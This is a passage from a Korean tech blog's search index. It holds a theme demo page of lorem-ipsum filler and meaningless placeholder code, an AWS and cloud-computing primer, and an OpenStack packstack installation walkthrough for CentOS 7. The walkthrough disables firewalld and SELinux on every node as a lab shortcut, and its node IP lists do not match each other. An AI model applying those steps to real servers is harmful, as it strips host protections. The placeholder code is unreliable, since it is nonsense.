관리하는 장소 프로세스를 언제, 어디서 어떻게 적재할 것인지를 커널이 관리 리눅스는 하나의 프로세스에 4GB의 가상 메모리 주소 공간을 할당 \r\r\r\r   ****   \rExpand\r...\r\r**** \r\r\r\r   ****   \rExpand\r...\r\r**** \r\r\r\r "});index.add({'id':165,'href':'/hidden/','title':"Hidden",'content':"This page is hidden in menu Quondam non pater est dignior ille Eurotas Latent te facies Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\n Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor  Cum honorum Latona O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer),\rpad.property_data_programming.sectorBrowserPpga(dataMask, 37,\rrecycleRup));\rintellectualVaporwareUser += -5 * 4;\rtraceroute_key_upnp /= lag_optical(android.smb(thyristorTftp));\rsurge_host_golden = mca_compact_device(dual_dpi_opengl, 33,\rcommerce_add_ppc);\rif (lun_ipv) {\rverticalExtranet(1, thumbnail_ttl, 3);\rbar_graphics_jpeg(chipset - sector_xmp_beta);\r}\r Fronde cetera dextrae sequens pennis voce muneris Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software;\rif (internic \u0026gt; disk) {\remoticonLockCron += 37 + bps - 4;\rwan_ansi_honeypot.cardGigaflops = artificialStorageCgi;\rsimplex -= downloadAccess;\r}\rvar volumeHardeningAndroid = pixel + tftp + onProcessorUnmount;\rsector(memory(firewire + interlaced, wired)); "});index.add({'id':166,'href':'/posts/base/','title':"Base",'content':"****          **** "});index.add({'id':167,'href':'/docs/cloudcomputing/awssaa/aws%EB%9E%80/','title':"AWS Base",'content':"AWS 란?   Amazon Web Services ( AWS )  AWS  AWS는 Amazon에서 제공하는 클라우드 서비스로, 네트워크를 기반으로 가상 컴퓨터와 스토리지를 비롯한 다양한 서비스를 제공 합니다.   Cloud Computing 와 AWS   AWS에 대해 공부하기 앞서, 우리는 Cloud Computing이 무엇이고, 어떠한 개념에 대해 알고 있어야 합니다. 그 이유는 AWS가 클라우드 컴퓨티 그 자체 이기 때문이죠.\n  클라우드 컴퓨팅 ( Cloud Computing : 이하 클라우드 )은 컴퓨터 리소스의 이용 형태로, 클라우드는 컴퓨터의 계산 리소스, 스토리지, 애플리케이션 처리를 네트워크 기반 서비스로 제공하는 것을 뜻 합니다.\n  클라우드 컴퓨팅의 클라우드는 \u0026ldquo;구름 ( Cloud )\u0026ldquo;를 의미하는 것으로, Cloud는 Google의 최고 경영 책임자인 에릭 슈미트가 2006년 8월 \u0026ldquo;인터넷에 접속해서 다양한 리소스를 사용할 수 있게 하는 구조\u0026quot;를 구름으로 예를 들면서 널리 사용되게 되었으며, 현재는 대표적으로 Google의 GCP ( Google Cloud Platform ), Microsoft의 Azure, Amazon의 AWS가 널리 사용되어지고 있습니다.\n  예전부터 네트워크를 이용한 컴퓨터 리소스를 공유하는 개념은 존재해왔지만, 클라우드란 용어가 정착하게 된 결정적인 이유는, 브로드 밴드 네트워크의 일반화, 하드웨어 및 소프트웨어의 진화와 구글과 같은 플랫폼을 제공하는 기업 등의 여러 상호작용의 결과라고 할 수 있습니다.\n     Cloud Computing의 종류   클라우드 컴퓨팅에도 여러 서비스의 종류가 있고, 이들 중 위의 그림에 나타난 클라우드 컴퓨팅을 대표하는 서비스에 대해 알아보도록 하겠습니다.   Infratructure as a Service : IaaS   IaaS는 가상 서버 또는 스토리지 등의 리소스를 인터넷을 기반으로 제공하는 서비스를 의미하며, 추가적으로 네트워크 서비스 자체를 포함하기도 합니다.\n  IaaS의 가장 큰 장점은 물리적인 하드웨어를 관리할 필요가 없음에도, 직접적으로 컴퓨터 리소르를 사용할 수 있다는 점입니다.\n  IaaS는 위의 그림에서처럼 가장 하단에 위치하며 클라우드 레이어로는 갖아 아래의 기초적인 부분을 담당합니다. 즉, IaaS는 물리 장치에 가장 가까운 서비스라 할 수 있습니다.\n   Platform as a Service   PaaS는 데이터베이스 또는 애플리케이션 서버 등의 미들웨어를 제공하는 서비스입니다.\n  OS와 미들웨어의 관리는 서비스 제공자가 하며, 사용자는 미들웨어만을 직접 사용할 수 있습니다.\n   Software as as Service   SaaS는 소프트웨어 또는 애플리케이션의 기능을 인터넷을 통해 제공합니다.\n  SaaS는 내부적으로 메일 서비스, 큐 서비스, 업무 관리 시스템 등으로 다양하게 분류되어 있습니다.\n  SaaS를 제공하는 것을 SaaS제공자 ( Provider )라고 부릅니다. 이는 ASP ( Application Service Provider )와 동일한 것으로, 다만 SaaS의 제공자는 클라우드라는 것에 조금 더 비중을 두어 말하는 것이 차이점이라 할 수 있습니다.\n     On Premise 서버와 Cloud 서버의 차이     On Premise ( 물리 서버 )라고하면 일반적으로 물리 머신을 한정해서 말하는 것이므로, 네트워크 장치 또는 전력 설비 등을 포함하는 의미로 On Premise라는 용어가 되었습니다.\n  On Premise는 조직 내부에서 사용할 목적으로 준비한 설비를 나타내며, 기업 내부에서 일반적으로 사용하는 형태라서 이전에는따로 명칭이 없었지만, 클라우드가 등장하면서 기존에 사용하던 형태를 나타내는 용어로 사용도기 시작했습니다.\n  그러면, On premise와 Cloud의 가장 큰 차이는 무엇일까요?, 그것은 크게 2가지로 소유자 ( Owner )와 용량 ( Capacity ) 입니다.\n   소유자 ( Owner )   On Premise와 Public의 첫 번째 차이는 소유자로, On Premise의 경우 리소스 등의 예외가 있을 수는 있지만, 일반적으로 설비를 준비한 기업이 소유하고 있습니다. 반면, Public은 해당 깅버이 모든 리소스를 소유하고, 해당 리소스를 서비스로 만든 것을 사용하는 형태로, 소유자와 사용자가 다르다고 할 수 있습니다.\n  소유자와 사용자가 다르다는 차이점은 다방면에서 영향을 끼칠 수 있습니다.\n  먼저 초기 비용의 차이입니다. On Premise는 서버 등을 이용할 때, 초기에 물리 장치를 구매해서 도입해야 하며, 여러 비용이 발생할 수 있습니다. 반면, AWS는 사용자가 물리 잧이를 구매할 필요가 없어 초기 비용이 거의 들지 않습니다. 이는 Public 차원에서 미리 물리 장치에 투자한 자산을 서비스 제공이라는 형태로 분산해서 회수하는 형태이기 때문입니다.\n  이어서 서버 등의 조달 기간입니다. On Premise의 경우는 견적을 받고 발주 및 배송에 몇 주에서 몇 달의 시간이 걸리는 것이 일반적이지만, 반면 Public 환경에서는 웹 브라우저, 콘솔, 프로그램에서 호출하면 몇 분 내로 조달이 완료됩니다.\n  이와 마찬가지로 사용하고 있는 서버를 추가하거나, 크기를 변경할 때도 동일합니다. On Premise의 경우는 시간과 비용이 들어가지만, 서버의 성능을 Scale Up하거나 이와 반대되는 경우, 혹은 서버자체를 새로 구매해야할 때, Public 상에서는 버튼 하나로 변경 및 추가 구매가 가능합니다.\n        Option On Premises Public     비용 초기에 모두 필요함 초기 비용은 따로 필요 없으며, 종량제 과금에 따라 비용이 분산되어 발생   서버 조달 기간 몇 주- 몇달 몇 분   서버 추가/ 변경 시간과 비용이 들어감 추가/ 변경과 관련된 비용이 필요하지 않음      용량 ( Capacity )   On Premise와 AWS에서는 소유와 사용에 따라 비용이 발생하는 방식이 다릅니다. 추가로 서버 조달 기간 또는 조달 비용도 다릅니다. 따라서 용량 ( Capacity ) 설계도 전혀 다르게 해야합니다.\n  On Premise는 서버 조달, 추가/변경으로 인한 기간이 길고, 비용이 크기 때문에 자원을 많이 사용할 때의 필요 자원에 맞춰서 모든 것을 준비해야 합니다. 반면 Public은 자원의 추가/ 변경이 쉬우며, 따라서 실제 수요에 맞춰 자원을 크게 만들 수도 있고, 작게 만들 수도 있습니다. 또한 대부분의 Public 플랫폼은 종량제 비용이므로 작게 만들면 비용을 줄일 수 있습니다.\n  즉, Public 인프라를 효율적으로 활용하려면, On Premise에서와 다르게 해야한다는 점 을 확실하게 이해해야 합니다.\n     렌탈 서버 ( 공유 서버 )와 Public의 차이   렌탈 서버   위에서 Public 인프라가 다른 소유자의 자원을 사용한다는 점을 말씀드렸습니다. 그렇다면 우리가 흔히 알고 있는 호스팅 서버 혹은 공용 서버라 불리는 렌탈서버와 다른 점을 무엇일까요?.\n  먼저 렌탈서버란 1대의 서버를 여러 사용자가 공용으로 사용 하는 형태로, 주로 웹 서버나 메일 서버를 사용하는 것이 일반적이었습니다.\n  즉, 1대의 물리서버를 모두 점유하는 전용 서버의 위에 가상 서버를 여러 개를 만들어, 해당 가상 서버를 점유하는 가상 전용 서버( VPS )라는 형태를 취하는 것이 렌탈 서버입니다.\n  그렇다면, 이러한 렌탈 서버에 문제점은 무엇일까요? 그것은 크게 3가지로 말씀드릴수 있는데, 낮은 자유도, 보안문제, 다른 사용자로 부터의 영향으로 정리할 수 있습니다.\n  먼저, 낮은 자유도라는 것은 공용 서버를 이용할 때에는 root 계정이 아닌, 사용자 권한의 계정만 부여되므로, 이는 애플리케이션이나 미들웨어를 자신이 원할 때 변경 등이 불가능하며, 자신이 원하는 대로 환경을 바꿀 수 없습니다.\n  이어 보안 문제또한 위에 이어지는 문제로, 기본적으로 자신이 원하는 환경을 구축할 수 없으므로, 보안 대책도 업자에게 맡기게됩니다. 이에 따라 취약성이 있는 미들웨어를 사용하고 있다는 것을 파악하여도, 사용자는 이를 해결하기 어려우며, 또한 만약 다른 사람이 만든 애플리케이션에 취약점이 발견되면, 그 취약점에 영향을 받을 수도 있습니다.\n  마지막으로는 다른 사용자로부터의 영향입니다. 만약 Apache를 사용하는 웹 서버를 이용할 때 공용 서버를 사용하면 유저마다 프로세스를 사용하는 것이 아닌, 모두 동일한 프로세스를 분할해서 사용하게 되는 데, 만약 1명의 사용자가 부하처리, CGI 등을 사용한 프로그램 처리가 폭주하면 모든 사용자는 영향을 받게 되어, 서비스가 중단될 수 있어, 공용 서버는 다른 사용자에게 영향을 받기 쉬운 형태라 할 수 있습니다.\n     전용 서버와 가상 전용 서버   위와 같은 렌탈 서버의 문제를 해결하기위해 전용서버와 가상 전용 서버라는 형태가 등장하게 되었습니다. 전용 서버와 가상 전용 서버는 관리자의 권한이 부여되어 있는 사용자 계정이 생성이 가능하여, 자유도가 높으며 스스로 관리가 가능합니다. 한편 전용서버는 1대의 물리 서버를 1명의 사용자에게 주어야 하기에, 비용적으로 부담이 크며, 이 때문에 가상화 기술을 사용해 1대의 물리 서버를 여러 대의 가상 서버로 분할해 비용을 줄인 것을 가상 전용 서버입니다. 또한 전용서버는 한 대의 물리서버이므로 다른 사용자의 영향을 전혀 받지 않으며, 반면 가상 전용 서버는 어느 정도의 영향을 받을 수 있지만, 렌탈 서버, 즉 공용 서버에 비해서는 거의 영향을 받지 않는 다고 할 수 있습니다.       옵션 공용 서버 전용 서버 가상 전용 서버     사용 형태 1대의 물리 서버를 분할해서 사용 1대의 물리 서버 점유 1대의 물리 서버 위에 있는 가상 서버를 점유   비용 적음 높음 중간   자유도 거의 없음 높음 높음   보안 관리 불가능 관리 가능 관리 가능   다른 사용자의 영향 높음 없음 거의 없음      렌탈 서버와 AWS ( Public )의 차이    EC2라는 AWS의 가상 컴퓨트 서비스는 가상화 기술을 사용해 1대의 물리 컴퓨터 위에 여러 개의 가상 컴퓨터를 만들어서 사용합니다.\n  여기에서 사용자는 관리자 권한을 가진 계정을 사용할 수 있으며, 해당 가상 컴퓨터 내부의 모든 것을 관리할 수 있습니다. 따라서 이러하 면에서 EC2는 가상 전용 서버와 비슷하다 할 수 있습니다.\n  그러나 EC2는 디스크를 동적으로 추가하거나, CPU와 메모리를 다른 인스턴스 유형으로 쉽게 변경하는 등의 기존의 렌탈 서버에 없는 기능이 많습니다. 또한, 가상 머신 이미지를 생성해서 백업하고, 백업한 이미지를 사용하여 여러 서버로 복제하는 등의 서비스도 이용이 가능합니다. 이와 같이 AWS와 같은 대부분의 클라우드 컴퓨팅을 서비스를 하는 기업의 대부분은 위에 렌탈 서버가 제공하는 서비스 뿐만아닌 추가적인 서비스를 더 제공하는 형태라고 할 수 있습니다.\n     Private Cloud와 Public Cloud   크게 클라우드의 형태는 Private Cloud와 Public Cloud가 있습니다. 이는 말을 정의하는 사람에 따라 의미가 조금씩 다를 수 있으며, 일반적인 의미에서는 누구에게 서비스를 제공하는 가에 따라 정의됩니다. 크게 Public Cloud는 GCP, Azure, AWS와 같이 누구에게나 서비스를 제공하는 형태의 서비스를 의미하고 Priavte Cloud는 기업 사내망, 즉 기업 전용서버로 해석되기도 하며, Public과는 반대로 특정 기업/ 조직 전용으로 제공되는 서비스를 의미합니다. 이 뿐만 아니라 현재는 이 둘을 혼용으로 사용하는 Hybrid Cloud와 특정 업종의 기업들이 함께 운영해나가는 Community Cloud라는 용어가 있습니다.   AWS에서의 Private Cloud의 정의   AWS를 제공하는 Amazon은 Public과 Private라는 용어를 따로 사용하고 있지 않습니다. 이는 클라우드라는 용어가 없었던 때부터 서비스를 시작한 Amazon의 자부심이라 할 수 있겠으며, 일반적으로 AWS를 대표적인 Public Cloud Service로 분류합니다. AWS 내에는 Virtual Private Cloud ( VPC )라는 서비스가 있는 데, 이는 가상 네트워크를 생성하여 IP 주소 범위, 라우트 테이블, 네트워크 게이트웨이 등을 자유롭게 설정할 수 있게 해주는 서비스로, VPC를 사용하면 기존 데이터 센터와 회사 내부에 만들던 것과 같은 방식으로 네트워크를 만들 수 있습니다. 경우에 따라서는 이를 Private 클라우드라 표현하기도 합니다.   AWS 서비스의 구성   AWS는 이미 30개가 넘는 서비스가 있으며, 해마다 새로운 서비스와 기능이 추가되므로 서비스의 전체적인 구성을 파악하는 것은 굉장히 힘듭니다. 하지만 AWS를 사용할 때에 대한 기본적인 개념, 사고방식 등은 베이스로 학습한 후에 진행하는 것이 보다 빠른 이해를 도울 것입니다.  "});index.add({'id':168,'href':'/docs/cloudcomputing/openstack/%EA%B0%80%EC%83%81%ED%99%94/','title':"Openstack CloudComputing",'content':"AWS 클라우드 아키텍처 설계를 통한 인프라 구축    가상화 ( Virtualization )   클라우드 컴퓨팅의 핵심적인 기술 단일한 물리 시스템에서 여러 환경이나 전용 리소스를 생성할 수 있는 기술, 1개의 시스템을 VM ( 가상 머신 )이라는 별도의 고유하고 안전한 환경으로 분할 가능 실제 물리적인 실제 서버처럼 운용이 가능   클라우드의 가상화 기술  일반적으로 클라우드란, 클라우드 컴퓨팅으로 흔히 말하는 클라우드는 클라우드 컴퓨팅을 얘기하며 클라우드 컴퓨팅이란 컴퓨터를 이용한 처리를 내 자원을 이용하는 것이 아닌 인터넷을 통해 제공되는 클라우드 사업자의 컴퓨터에서 처리하는 것을 의미 인터넷을 통해 사상화된 컴퓨터의 다양한 자원과 어플리케이션을 온 디맨드 ( 사용자의 욕에 따라 바로 제공 )로 제공하는 서비스 도커는 하이퍼 기반이 아닌 컨테이너 기반 NIST ( 미국 굽립 표준 기술연구소 )에서는 공유 구성이 가능한 컴퓨팅 리소스(네트워크, 서버, 스토리지, 애플리케이션 서비스)의 통합을 통해 어디서나 편하게 요청에 따라\t네트워크를 통해 접근하는 것을 가능하게 하는 모델로 정의 NIST에서 정한 클라우드의 특징  주문형 셀프 서비스 : 개별 관리화면을 통해 서비스 이용 가능 광범위한 네트워크 접속 : 다양한 디바이스를 통해 서비스에 접속 리소스의 공유 : 사업자의 컴퓨터 자원을 여러 사용자가 공유하는 형태로 이용 신속한 확장성 : 필요에 따라 스케일 업, 스케일 다운 가능 측정 가능한 서비스 : 이용한 만큼 요금이 부과, 종량제     클라우드의 등장 배경 1980\t메인 프레임에서 대부분 처리\t메인(모든 것 처리)----클라이언트\r1990\t클라이언트에서도 처리 기능이 추가\t메인(처리)----클라이언트(처리)\r2000\t사내 서버에서 처리\t메인(모든 것 처리)----클라이언트\r현재\t서버에서 처리하는 것은 동일하나 서버를 소유X\t메인(모든 것 처리) 클라이언트\r 클라우드는 전혀 새로운 개념은 아니다. 하지만 기존에는 개념만 존재했을 뿐 실제로 구현하는데 여러 문제점이 있었다. (가상화 문제,네트워크 속도, 보안 문제) 하지만 계속된 발전을 거듭해서 현재는 실제로 상용화까지     클라우드의 가상화의 종류   laaS 이아스 ( 서버까지만 )\n  PaaS 파 ( 서버에서 주요 소프트웨어 )\n  SaaS 사 ( 다른 세세한 것들 또한 설치해 주는 것 )\n  최근 추가된 개념\n  HaaS : 특정 하드웨어가 필요한 경우 필요한 하드웨어를 서비스 받는 것\n  FaaS : 클라우드에 함수를 등록하고, 함수만을 서비스로 이용하는 형태\n  BaaS : 앱 개발자가 서버 기술을 몰라도 그 환경에 연결되는 모바일 앱을 만들 수 있게 돕는 서비스\n     클라우드의 단점  클라우드 서버가 유출될 경우 모든 서버가 공격 대상이 됨 이중화를 해 놓지 않은 경우 서버가 닫힐 위험이 있음    클라우드 이용 모델  Public Cloud : 클라우드 서비스를 제공해주는 업체의 서비스를 이용하는 방식 Private Cloud : 클라우드 관련 기술이 활용된 자사의 서버를 자체적으로 구축 Hy : 퍼블릭 클라우드 방식과 프라이빗 클라우드 방식을 적절히 사용하는 방식 커뮤니티 클라우드 : ㅁㄴㅇㄴ   클라우드와 온 프레미스   직접 서버를 가지고 운용하는 방식의 온 프레미스와 서버를 빌려서 사용하는 개념의 클라우드 빌려쓰는 만큼 능동적으로 사용이 가능      AWS의 클라우드    AWS의 클라우드 서비스 시스템 관련 클라우드 서비스   EC2 (Elastic Compute Cloud)  클라우드 환경에서 서버를 할당 받아 사용할 수 있는 서비스, 서버 호스팅과 비슷한 개념이지만, 실제 물리적인 서버를 할당 받는 것이 아니라 클라우드 환경에서 가상 서버를 할당 받는 것이 다른 점   Auto Scaling  수요에 따라 EC2의 규모를 자동으로 조절 할 수 있는 서비스. 예를 들어 web server의 cpu load가 50%가 넘어가면 새로운 web server를 추가하도록 세팅이 가능하다.     스토리지 관련 클라우드 서비스   Glacier\n 저비용 데이터 보관 및 백업 서비스. 자주 사용되지 않는 데이터를 보관 및 백업하는데 유용한 서비스    S3 (Simple Storage Service)\n 객체 스토리지 서비스. 웹에서 바로 접근 할 수도 있고, EC2에서 mount해서 사용할 수도 있다. 스토리지 혼자 존재 가능    EBS (Elastic Block Storage)\n EC2 인스턴스에서 사용할 수 있는 블록 스토리지. 용량, IOPS 설정등이 가능하다. 스토리지 혼자 존재 불가능 S3는 네트워크 스토리지, EBS는 서버에 추가할 수 있는 하드웨어 스토리지(SATA 하드 같은)와 같은 개념.    CloudFront\n 콘텐츠 전송용 웹서비스. CDN과 비슷한 서비스로, EC2나 S3같은 서비스에서 사용시 가장 가까운 엣지로 자동 라우팅되서 콘텐츠 전송 속도를 향상할 수 있다.    Storage Gateway\n aws의 스토리지와 로컬 스토리지를 연동해주는 서비스. 로컬에 있는 DAS, NAS, SAN 과 같은 장비와 S3를 연동해서 메인 데이터는 S3에 두고 접근빈도가 높은 데이터는 로컬 스토리지에 케싱하거나, 모든 데이터는 로컬 스토리지에 두고 일정 시간에 따라 주시적으로 데이터의 스냅샷을 S3에 저장하는 등의 서비스를 구축할 수 있다.    Import / Export\n 대용량 데이터를 이동식 디바이스에 직접 import / export 해 주는 서비스. 외장 하드같은 디바이스를 Amazon에 우편으로 보낸 다음, 데이터를 Import 또는 Export 후 다시 돌려받는 방식.     네트워크 관련 클라우드 서비스   Route 53\n DNS 서비스    Elastic Load Balancing\n Load Balancing 서비스    VPC (Virtual Private Cloud)\n 사설 네트워크 서비스     데이터 관련 클라우드 서비스   RDS (Relational Database Service)\n RDBMS 클라우드 서비스. MySQL, PostgreSQL, Oracle, SQL Server 지원.   EC2에 새로 Instance를 생성하고 직접 설치해서 사용할 수도 있지만 RDS를 사용할 경우 유지 보수 이슈를 획기적으로 줄일수 있다.(Amazon이 관리해주니까 관리자가 따로 필요 없다.) 하지만 서버에 직접 접근 권한이 없기 때문에 사용에 제한이 많을 수 있다.    DynamoDB\n 아마존에서 서비스하는 NoSQL 데이터 베이스    Elastic Cache\n Caching 서비스. Memcached, Redis 지원.    EMR (Elastic MapReduce)\n AWS상에서 서비스되고 있는 Hadoop 프레임워크 위에서 사용할 수 있는 MapReduce 서비스. 데이터의 종류나 양에 따라 Mapreduce에 필요한 리소스의 가변폭이 큰 경우 아주 유용할 듯. 하지만 사용하기 위해서는 반드시 Hadoop도 AWS상에 구축되어야 한다.    Data Pipeline\n  서버 또는 스토리지간 주기적인 데이터 이동을 지원하는 서비스.\n  MySQL, PostgreSQL, Oracle, SQL Server, Redis, Memcached를 제외한 다른 어플리케이션들은 직접 설치하거나 EC2에 새로운 인스턴스를 생성할때 Amazon Marketplace에서 패키징된 OS를 선택해야 함.\n        OpenStack    클라우드 서비스(오픈스택을 기준으로)    시스템 관련 클라우드 서비스\n Nova    스토리지 관련 클라우드 서비스\n Swift : 객체 스토리지 Cinder : 블록 스토리지    네트워크 관련 클라우드 서비스\n Neutron    데이터 관련 클라우드 서비스\n Glance Trove    기타 클라우드 서비스\n Horizon Keystone     업종별·목적별 클라우드 활용 사례 -웹 사이트에서 클라우드 활용 -소셜 게임의 클라우드 활용 -애플리케이션 개발/테스트 환경에서의 클라우드 활용 -스타트업 기업에서의 클라우드 활용 -BCP(비지니스 연속성 계획)의 클라우드 활용 -ERP(통합 기간 업무 시스템)에서의 클라우드 활용 -제조업의 클라우드 활용 -지자체 클라우드 -교육 분야의 클라우드 활용 -농업 분야의 클라우드 활용 -빅 데이터 이용을 위한 클라우드의 활용 -IoT에서 클라우드 활용 -인공 지능 등의 새로운 산업 영역에서의 클라우드 활용  Packtack을 이용한 설치 오픈 스택 오픈스택이란? 클라우드 환경에서 컴퓨팅 자원과 스토리지 인프라를 설치하고 구동하기 위해 사용하는 오픈 소스 SW 프로젝트의 집합  설치 방법 메뉴얼을 이용한 설치 Devstack을 이용한 설치 자동화 툴을 이용한 설치\n자동화 툴 packstack을 이용한 설치 자동화 툴을 이용한 설치 2) 준비 가상머신 3대\tcpu\t메모리\t디스크 controller\t1\t3gb\t50gb compute\t1\t2gb\t50gb network\t1\t1gb\t20gb\ncontroller 192.168.0.62\rcompute\t192.168.0.200\rnetwork\t192.168.0.201\r OS 설치 CentOS 7 버전 각각 minimal로 설치  각각 맞는 대역을 설정\n yum -y install bind-utils     전체 설치 과정   호스트명 설정 controller | comupte | network 노드 vi /etc/hosts\t아래에 각 노드의 내용을 추가  192.168.0.62 controller\r192.168.0.162 compute\r192.168.0.163 network\r  controller | compute | network의 hostname에 기존 내용 지우고 다음과 같이 수정 vi/etc/hostname  controller 192.168.0.62\rcompute\t192.168.0.162\rnetwork\t192.168.0.166\r  재시작    2. 방화벽 설정\n controller 노드  systemctl stop firewalld\rsystemctl disable firewalld\rsystemctl stop NetworkManager\rsystemctl disable NetworkManager\rsetenforce 0\rsed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux\r  compute 노드  systemctl stop firewalld\rsystemctl disable firewalld\rsystemctl stop NetworkManager\rsystemctl disable NetworkManager\rsetenforce 0\rsed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux\r  network 노드  systemctl stop firewalld\rsystemctl disable firewalld\rsystemctl stop NetworkManager\rsystemctl disable NetworkManager\rsystemctl status firewalld\rsetenforce 0\rsed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux\r 전체 재시작    3. ssh 설정 controller 노드\nssh-keygen\r엔터 3번 ( 암호 없이 입력 )\nssh-copy-id root@controller\r패스워드 입력\rssh-copy-id root@compute\r패스워드 입력\rssh-copy-id root@network\r패스워드 입력\r  4. 오픈스택 설치 파일 다운\n controller 노드  yum update -y\ryum install centos-release-openstack-rocky -y\ryum install openstack-packstack -y\ryum install openstack-utils -y\ryum install chrony ntp -y\r오픈스택 설치 파일 설정   controller 노드  packstack --gen-answer-file=/root/rocky-answer.txt\r vi /root/rocky-answer.txt\rCONFIG_CONTROLLER_HOST=[컨트롤러 노드 IP]\r# controller Node\rCONFIG_COMPUTE_HOSTS=[컴퓨트 노드 IP],[컴퓨트 노드 IP],[컴퓨트 노드 IP]\r# compute Node, CONFIG_NETWORK_HOSTS=[네트워크 노드 IP],[네트워크 노드 IP]\r# Network node\rCONFIG_PROVISION_DEMO=n\rCONFIG_NTP_SERVERS=0.centos.pool.ntp.org iburst, 1.centos.pool.ntp.org iburst, 2.centos.pool.ntp.org iburst, 3.centos.pool.ntp.org iburst\rCONFIG_CINDER_VOLUMES_SIZE=50G\r오픈스택 설치 진행   controller 노드  packstack --answer-file=/root/rocky-answer.txt\r 확인 [ IP ]/dashboard 1f80b10c5dee4592  특정 노드 추가  예시) 컴퓨트 노드 추가   \r예시) 컴퓨터 노드 추가\r↕\r\r CPU\tMEM\tHDD\t네트워크 Controller\t1\t4\t50\tNAT, VMnet1 Compute\t2\t2\t80\tNAT, VMnet1   IP, hosts 등 기본 설정 후 controller 노드  vi /root/rocky-answer.txt    CONFIG_CONTROLLER_HOST=[ 추가할 IP ]\rCONFIG_COMPUTE_HOSTS=[ 추가할 IP ]\rCONFIG_NETWORK_HOSTS=[ 추가할 IP ]\rEXCLUDE_SERVERS=[ 제외 아이피 ]\r설치진행  packstack --answer-file=/root/rocky-answer.txt\rpackstack --allinone\r확인 [ IP ]/dashboard  \r\r\r   초기설정  TYPE=Ethernet\rPROXY_METHOD=none\rBROWSER_ONLY=no\rBOOTPROTO=static\rDEFROUTE=yes\rIPV4_FAILURE_FATAL=no\rIPV6INIT=yes\rIPV6_AUTOCONF=yes\rIPV6_DEFROUTE=yes\rIPV6_FAILURE_FATAL=no\rIPV6_ADDR_GEN_MODE=stable-privacy\rNAME=enp3s0\rUUID=bdc4a55f-51ae-4205-bb35-196d28878451\rDEVICE=enp3s0\rONBOOT=yes\rIPADDR=192.168.0.62\rNETMASK=255.255.255.0\rGATEWAY=192.168.0.1\rDNS1=8.8.8.8\r~\r네트워크 노드  vi ifcfg-ens33  DEVICE=ens33\rTYPE=OVSPort\rDEVICETYPE=ovs\rOVS_BRIDGE=br-ex\rONBOOT=yes\r vi ifcfg-br-ex  DEVICE=br-ex\rDEVICETYPE=ovs\rTYPE=OVSBridge\rBOOTPROTO=static\rIPADDR=192.168.10.10\rNETMASK=255.255.255.0\rGATEWAY=192.168.10.2\rONBOOT=yes\r  systemctl restart network\n  확인\n ovs-vsctl show    yum install bind-utils -y\n  yum install net-tools -y\n  openstack 서비스 재시작\n  openstack-service list | xargs systemctl restart\r 대시보드 에러   \rvi /etc/httpd/conf.d/15-horizon_vhost.conf\r↕\r\r************************************ Vhost template in module puppetlabs-apache Managed by Puppet ************************************ \u0026lt;VirtualHost *:80\u0026gt; ServerName controller ServerAlias 192.168.10.10 ServerAlias 10.10.10.10 ServerAlias controller ServerAlias localhost WSGIApplicationGroup %{GLOBAL} WSGIDaemonProcess apache display-name=horizon group=apache processes=2 threads=1 user=apache WSGIProcessGroup apache WSGIScriptAlias /dashboard \u0026ldquo;/usr/share/openstack-dashboard/openstack_dashboard/wsgi/django.wsgi\u0026rdquo;\nVhost docroot DocumentRoot \u0026ldquo;/var/www/\u0026rdquo;\nAlias declarations for resources outside the DocumentRoot Alias /dashboard/static \u0026ldquo;/usr/share/openstack-dashboard/static\u0026rdquo;\nDirectories, there should at least be a declaration for /var/www/ \u0026lt;Directory \u0026ldquo;/var/www/\u0026ldquo;\u0026gt; Options Indexes FollowSymLinks MultiViews AllowOverride None Require all granted \u0026lt;Directory \u0026ldquo;/usr/share/openstack-dashboard/openstack-dashboard/wsgi\u0026quot;\u0026gt; Options All AllowOverride All Require all granted \u0026lt;Directory \u0026ldquo;/usr/share/openstack-dashboard/static\u0026quot;\u0026gt; Options All AllowOverride All Require all granted Logging ErrorLog \u0026ldquo;/var/log/httpd/horizon_error.log\u0026rdquo; ServerSignature Off CustomLog \u0026ldquo;/var/log/httpd/horizon_access.log\u0026rdquo; combined\nRedirectMatch rules RedirectMatch permanent ^/$ /dashboard\nServer aliases \r\r\r   네트워크 추가 ( 관리자가 관리자 프로젝트 )   외부 네트워크 추가(브릿지처럼)   관리 -\u0026gt; 네트워크 -\u0026gt; 네트워크 생성 -\u0026gt; 이름(external), 프로젝트(admin), 공급자 유형(Flat), 물리 네트워크(extnet) 밑에 4가지 다 체트 -\u0026gt; 다음 ( 공유와 외부네트워크는 수정 후에 체크 필요 )\n  서브넷 이름(external-subnet), 네트워크 주소(192.168.10.0/24), 6P버전(4), 게이트웨이 IP(192.168.10.2) -\u0026gt; 다음\n  Pools 할당 (192.168.10.50,192.168.10.100), DNS 네임 서버(8.8.8.8) -\u0026gt; 생성\n    내부 네트워크 추가(Host-Only처럼)   프로젝트 -\u0026gt; 네트워크 -\u0026gt; 네트워크 생성 -\u0026gt; 네트워크 이름(internal), 나머지는 그대로 -\u0026gt; 다음\n  서브넷 이름(internal-subnet), 네트워크 주소(111.111.111.0/24), IP버전(4), 게이트웨이 IP(111.111.111.1) -\u0026gt; 다음\n  DNS 네임 서버(8.8.8.8) -\u0026gt; 생성\n    가상의 라우터 생성   프로젝트 -\u0026gt; 네트워크 -\u0026gt; 라우터 생성 -\u0026gt; 라우터 이름(test-router), 외부 네트워크(external 선택), 나머지 그대로 -\u0026gt; 라우터 생성\n 라우터 이름 클릭 -\u0026gt; 인터페이스 탭 -\u0026gt; 인터페이스 추가 -\u0026gt; 서브넷(internal 선택), IP주소(111.111.111.1) -\u0026gt; 제출   vgremove cinder-volumes vgdisplay\ndd if=/dev/zero of=cinder-volumes bs=1024 count=52428800 fallcocate -l 50G cinder-volumes ln -s /home/cinder-volumes /var/lib/cinder/cinder-volumes\nlosetup /dev/loop0 